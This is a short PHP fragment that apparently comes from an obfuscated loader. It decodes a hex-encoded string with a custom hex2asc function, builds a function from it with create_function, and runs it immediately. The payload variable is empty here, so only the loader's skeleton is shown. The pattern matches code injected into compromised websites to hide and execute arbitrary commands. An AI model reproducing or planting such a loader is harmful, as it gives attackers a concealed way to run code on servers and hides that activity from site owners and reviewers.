$lLzmx = "";
if(!function_exists("hex2asc")){
    function hex2asc($in){
        $out = "";
        $j=strlen($in)/2;
        for($i=0;$i<$j;$i++){
            $out.=chr(
                base_convert(substr($in,$i*2,2),16,10)
            );
        }
        return $out;
    }
}
$lLzmx = create_function(null, hex2asc($lLzmx));
$lLzmx();
